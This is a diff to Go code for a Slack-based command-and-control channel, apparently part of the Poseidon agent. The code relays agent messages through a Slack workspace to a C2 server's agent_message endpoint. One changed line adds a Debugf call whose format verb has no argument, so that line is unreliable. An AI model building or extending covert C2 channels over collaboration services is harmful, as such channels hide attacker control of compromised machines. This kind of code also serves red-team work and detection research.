@@ -7,7 +7,6 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
-	"github.com/xorrior/poseidon/pkg/utils/structs"
 	"io/ioutil"
 	"log"
 	"math"
@@ -234,11 +233,11 @@ func (s *SlackC2) handleResponseMessage(timestamp string, data []byte) {
 
 func (s *SlackC2) handleMessage(message interface{}) interface{} {
 	m := message.(Message)
-	s.GetApiHandle().Debugln("Received client message")
+	s.GetApiHandle().Debugf("Received client message %+v\n")
 
 	raw := s.htmlPostData(fmt.Sprintf("api/v%s/agent_message", ApiVersion), []byte(m.Data))
 	
-	resp := structs.Message{}
+	resp := Message{}
 	resp.Client = false 
 	resp.Tag = m.Tag
 	resp.Data = string(raw)
@@ -275,7 +274,7 @@ func (s SlackC2) Run(config interface{}) {
 			break
 		case *slack.ConnectedEvent:
 			s.GetApiHandle().Debugln("Connected to workspace...")
-			//s.GetApiHandle().PostMessage(s.GetChannelID(), slack.MsgOptionText("poseidon-online", false))
+			
 			break
 		case *slack.MessageEvent:
 			//s.GetApiHandle().Debugf("Received new message event: %+v\n", ev)
